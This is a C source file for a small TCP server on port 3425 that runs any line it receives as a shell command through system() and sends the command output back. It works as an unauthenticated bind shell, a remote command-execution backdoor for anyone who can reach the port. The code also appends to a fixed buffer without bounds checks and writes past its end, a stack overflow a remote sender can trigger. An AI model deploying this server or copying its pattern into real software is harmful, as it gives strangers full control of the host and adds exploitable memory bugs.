#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>

#define BUF_SIZE 1024
#define OUTPUT_SIZE BUF_SIZE*8
#define COULD_NOT_OPEN_FILE_ERR "Could not open this file!"

int readFile(char *file_name, char *buf, int buf_size){
	/* opening output to get it */
	FILE *fp;
	if( (fp=fopen(file_name, "rb")) == NULL ){
		/* got an error */
		return -1 ;
	}

	/* sending of read from output file bytes */
	int output_read_bytes = fread(buf, sizeof(char), buf_size, fp);
	fclose(fp);

	return output_read_bytes ;
}

int sendFile(int sock, char *file_name){
	char output[OUTPUT_SIZE];
	int file_read_bytes;
	do{
		file_read_bytes = readFile(file_name, output, OUTPUT_SIZE-1);

		if(file_read_bytes != -1){
			send(sock, output, file_read_bytes, 0);
		}
	}while( file_read_bytes == OUTPUT_SIZE );

	if(file_read_bytes == -1){	
		send(sock, COULD_NOT_OPEN_FILE_ERR,
			strlen(COULD_NOT_OPEN_FILE_ERR), 0
		);
	}
	return 0 ;
}

int sendStr(int sock, char *str){
	send(sock, str, strlen(str), 0);
	return 0 ;
}

char chomp(char *str, char chr){
	while(*str){
		++str;
	}

	char last_chr;
	if( (last_chr = *(--str)) == chr){
		*str = '\0' ;
	}

	return last_chr ;
}

int main(void){
	int sock, listener;
	struct sockaddr_in addr;
	char buf[BUF_SIZE];
	char output[OUTPUT_SIZE];
	char errput[OUTPUT_SIZE];
	int bytes_read;

	listener = socket(AF_INET, SOCK_STREAM, 0);
	if(listener<0){
		perror("socket");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(3425);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if(  bind( listener, (struct sockaddr *)&addr, sizeof(addr) )  ){
		perror("bind");
		exit(2);
	}

	listen(listener, 1);

	while(true){
		sock = accept(listener, NULL, NULL);
		if(sock <0){
			perror("accept");
		}

		printf("Someone connected...\n");

		while(true){
			bytes_read = recv(sock, buf, BUF_SIZE, 0);
			if(bytes_read<=0){
				break;
			}

			buf[bytes_read] = '\0' ;
			chomp(buf, '\n');
			strcat(buf, " >output.txt 2>&1");
			printf("%s\n", buf);
			system(buf);

			sendFile(sock, "output.txt");
	
			remove("output.txt");
		}

		close(sock);
	}

	return 0;
}
